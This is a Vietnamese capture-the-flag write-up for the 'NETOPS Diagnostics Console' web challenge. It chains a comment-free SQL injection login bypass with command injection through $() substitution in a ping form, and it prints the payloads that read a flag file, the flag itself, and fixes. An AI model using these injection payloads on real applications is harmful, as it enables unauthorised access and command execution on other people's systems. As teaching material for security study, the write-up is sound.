+++
title = "HCM PTIT CTF 2026 — NETOPS Diagnostics Console"
date = 2026-10-31T20:01:00+07:00
draft = false
tags = ["HCM PTIT CTF 2026", "Web", "SQL Injection", "Command Injection"]
categories = ["Writeups"]
summary = "Bypass form đăng nhập mà không cần SQL comment, sau đó tận dụng command substitution trong công cụ ping để đọc flag."
ShowToc = true
TocOpen = false

[cover]
  image = "/images/hcm-ptit-ctf-2026.jpg"
  alt = "HCM PTIT CTF 2026"
+++

NETOPS có hai lớp liên tiếp: SQL Injection đưa mình vào trang quản trị với quyền guest, sau đó công cụ ping trong trang này cho phép chèn lệnh hệ thống. Blacklist của cả hai chỗ đều chặn vài payload quen thuộc nhưng không giải quyết được nguyên nhân gốc.

## Bypass đăng nhập không cần comment

Nhập một dấu nháy đơn vào username làm ứng dụng trả lỗi SQLite. Câu truy vấn phía sau có dạng:

```sql
SELECT * FROM users
WHERE username='$username' AND password='$password'
```

Các payload dùng `--` hoặc `/*` bị filter từ chối. Thay vì tìm cách encode comment, có thể tạo một nhánh `OR` luôn đúng và để phần kiểm tra password rơi vào nhánh cuối:

```text
username: ' OR '1'='1' OR 'x
password: bất kỳ
```

Sau khi nối chuỗi, điều kiện trở thành:

```sql
WHERE username='' OR '1'='1' OR 'x' AND password='...'
```

`AND` được tính trước `OR`, nên biểu thức tương đương:

```sql
username='' OR '1'='1' OR ('x' AND password='...')
```

Nhánh giữa luôn đúng. Ứng dụng cho phép truy cập `/admin`, nhưng phiên sau khi bypass chỉ có vai trò guest.

## Từ công cụ ping đến shell

Trang admin có form `/admin/tools/ping`. Dấu `;`, `&` và backtick bị chặn, nhưng `$`, `(` và `)` vẫn đi qua. Khi thêm một dấu `)` thừa, phản hồi trả về lỗi cú pháp từ `/bin/sh`; như vậy input đang được shell phân tích.

Cú pháp command substitution `$()` đủ để chạy lệnh mà không cần các ký tự phân tách đã bị blacklist:

```text
127.0.0.1$(whoami)
```

Kết quả của `whoami` được nối vào hostname. `ping` thất bại và thông báo lỗi in luôn giá trị vừa được chèn:

```text
ping: 127.0.0.1appuser: Name does not resolve
```

## Tìm và đọc flag

Tìm các file có tên chứa `flag` trên hệ thống:

```text
127.0.0.1$(find / -iname '*flag*' 2>/dev/null)
```

Kết quả để lộ đường dẫn:

```text
/opt/loot/.hidden_flag
```

Đọc file bằng cùng kỹ thuật:

```text
127.0.0.1$(cat /opt/loot/.hidden_flag)
```

Nội dung flag lại trở thành một phần của hostname không hợp lệ:

```text
ping: 127.0.0.1PTITHCM{c14ss1c_sqli_ch41n_2_cmd_inj3ct10n}: Name does not resolve
```

Flag:

```text
PTITHCM{c14ss1c_sqli_ch41n_2_cmd_inj3ct10n}
```

Hai blacklist chỉ làm payload dài hơn. Form đăng nhập cần truy vấn tham số hóa; công cụ ping cần kiểm tra IP/hostname theo allowlist và thực thi `ping` bằng danh sách đối số, không đi qua shell. Ngoài ra, tài khoản guest không nên nhìn thấy công cụ vận hành có khả năng tác động tới hệ thống.
